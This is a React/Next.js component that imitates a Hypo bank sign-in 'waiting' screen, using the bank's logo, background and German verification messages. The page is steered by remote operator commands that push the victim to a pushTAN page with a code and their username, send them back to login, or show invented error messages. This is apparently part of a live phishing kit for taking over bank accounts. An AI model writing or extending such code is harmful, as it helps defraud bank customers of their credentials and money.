"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import Footer from "@/components/Footer";
import HelpButton from "@/components/HelpButton";
import { onCommand } from "@/lib/track";

export default function WaitingScreen({ user }: { user: string }) {
  const router = useRouter();
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    onCommand((cmd) => {
      if (cmd.type === "forward_to_tan") {
        const code = (cmd.payload as { code?: string }).code || "";
        router.push(`/pushtan?code=${encodeURIComponent(code)}&user=${encodeURIComponent(user)}`);
      } else if (cmd.type === "back_to_login") {
        router.push("/");
      } else if (cmd.type === "show_error") {
        setError((cmd.payload as { message?: string }).message || "Ein Fehler ist aufgetreten.");
      } else if (cmd.type === "clear_error") {
        setError(null);
      }
    });
    return () => onCommand(() => {});
  }, [router, user]);

  return (
    <div
      className="min-h-screen flex flex-col login-bg"
      style={{
        backgroundImage: "url('/hypobank/bg-lake.jpg')",
        backgroundColor: "#1a3a5c",
      }}
    >
      {/* Minimal header matching Hypo style */}
      <header className="relative w-full">
        <div className="absolute top-0 left-0 right-0 h-1 z-50" />
        <div className="relative px-4 py-2" />
      </header>

      <main className="flex-1 flex flex-col">
        <div className="flex justify-center items-end sm:items-center min-h-[calc(100vh-60px)] px-4 sm:px-0">
          <div className="relative bg-white rounded-lg w-full max-w-[460px] pt-[34px] mt-[34px] pb-3 flex flex-col shadow-lg sm:min-h-0 min-h-[calc(100vh-100vw+0.625rem)]">
            {/* Logo */}
            <div className="absolute -top-[34px] left-0 right-0 flex justify-center">
              <div
                className="w-[68px] h-[68px] bg-center bg-no-repeat"
                style={{ backgroundSize: "68px", backgroundImage: "url('/hypobank/hypo-logo.svg')" }}
              />
            </div>

            {/* Content */}
            <div className="flex-1 overflow-hidden mt-6">
              <div className="px-3 sm:px-4">
                <h1 className="text-2xl font-normal mb-2">Anmeldung</h1>

                {error && (
                  <div
                    className="mb-4 px-3 py-2 rounded text-sm"
                    style={{
                      backgroundColor: "#fef2f2",
                      border: "1px solid #fca5a5",
                      color: "#b91c1c",
                    }}
                  >
                    {error}
                  </div>
                )}

                <div className="flex flex-col items-center gap-4 py-8">
                  {/* Spinner in Hypo primary blue */}
                  <svg
                    className="animate-spin"
                    width="56"
                    height="56"
                    viewBox="0 0 56 56"
                    fill="none"
                  >
                    <circle
                      cx="28"
                      cy="28"
                      r="24"
                      stroke="var(--hyp-gray-300)"
                      strokeWidth="4"
                    />
                    <path
                      d="M52 28c0-13.255-10.745-24-24-24"
                      stroke="var(--hyp-primary)"
                      strokeWidth="4"
                      strokeLinecap="round"
                    />
                  </svg>

                  <p className="text-sm text-center" style={{ color: "rgba(0,0,0,0.87)" }}>
                    Ihre Daten werden überprüft...
                  </p>
                  <p className="text-xs text-center" style={{ color: "rgba(0,0,0,0.54)" }}>
                    Bitte warten Sie einen Moment.
                  </p>
                </div>
              </div>
            </div>

            {/* Cancel button */}
            <div className="px-3 sm:px-4 pt-3 flex justify-center">
              <button
                type="button"
                onClick={() => router.push("/")}
                className="hyp-btn-primary w-full sm:w-1/2"
                style={{
                  backgroundColor: "transparent",
                  color: "var(--hyp-primary)",
                  border: "2px solid var(--hyp-primary)",
                }}
              >
                Abbrechen
              </button>
            </div>
            <div className="px-3 sm:px-4 mb-1" />
          </div>
        </div>
      </main>

      <Footer />
      <HelpButton />
    </div>
  );
}
